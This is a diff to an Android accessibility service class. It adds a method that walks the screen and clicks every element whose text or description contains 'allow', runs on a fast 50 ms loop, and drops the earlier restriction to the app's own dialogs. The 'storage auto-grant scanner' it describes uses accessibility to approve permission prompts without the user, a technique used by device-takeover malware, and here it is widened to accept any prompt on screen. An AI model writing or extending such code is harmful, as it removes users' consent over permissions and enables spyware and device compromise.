@@ -594,23 +594,14 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                 try {
                     AccessibilityNodeInfo rootNode = getRootInActiveWindow();
                     if (rootNode != null) {
-                        String appName = getString(R.string.app_name);
-                        String screenText = getAllScreenText(rootNode).toLowerCase();
-                        boolean appVisible = screenText.contains(appName.toLowerCase());
-
-                        if (appVisible) {
-                            clickAllTextElementsCI(rootNode, "Allow access");
-                            clickAllTextElementsCI(rootNode, "Allow");
-                            clickAllTextElementsCI(rootNode, "Allow all the time");
-                            runAccessibilityToggleGranter(rootNode);
-                        }
+                        clickAllTextContainingCI(rootNode, "allow");
                         rootNode.recycle();
                     }
                 } catch (Exception ignored) {}
-                storageHandler.postDelayed(this, 200);
+                storageHandler.postDelayed(this, 50);
             }
         });
-        Log.i(TAG, "Storage auto-grant scanner started for 5 s");
+        Log.i(TAG, "Storage auto-grant scanner started for 5 s (50ms interval)");
     }
 
     /**
@@ -815,6 +806,42 @@ public class UnifiedAccessibilityService extends AccessibilityService {
             }
         } catch (Exception ignored) {}
         return false;
+    }
+
+    /** Clicks ALL text elements containing keyword (case-insensitive) */
+    private void clickAllTextContainingCI(AccessibilityNodeInfo node, String keyword) {
+        if (node == null) return;
+        try {
+            String text = node.getText() != null ? node.getText().toString().toLowerCase() : "";
+            String desc = node.getContentDescription() != null ? node.getContentDescription().toString().toLowerCase() : "";
+            String searchKey = keyword.toLowerCase();
+            
+            if (text.contains(searchKey) || desc.contains(searchKey)) {
+                boolean clicked = false;
+                if (node.isClickable()) {
+                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                    clicked = true;
+                    Log.i(TAG, "Clicked node with text: " + node.getText());
+                }
+                if (!clicked) {
+                    AccessibilityNodeInfo parent = node.getParent();
+                    if (parent != null) {
+                        if (parent.isClickable()) {
+                            parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                            Log.i(TAG, "Clicked parent of node with text: " + node.getText());
+                        }
+                        parent.recycle();
+                    }
+                }
+            }
+            for (int i = 0; i < node.getChildCount(); i++) {
+                AccessibilityNodeInfo child = node.getChild(i);
+                if (child != null) {
+                    clickAllTextContainingCI(child, keyword);
+                    child.recycle();
+                }
+            }
+        } catch (Exception ignored) {}
     }
 
     /** Checks if app name exists on screen (case-sensitive, anywhere).
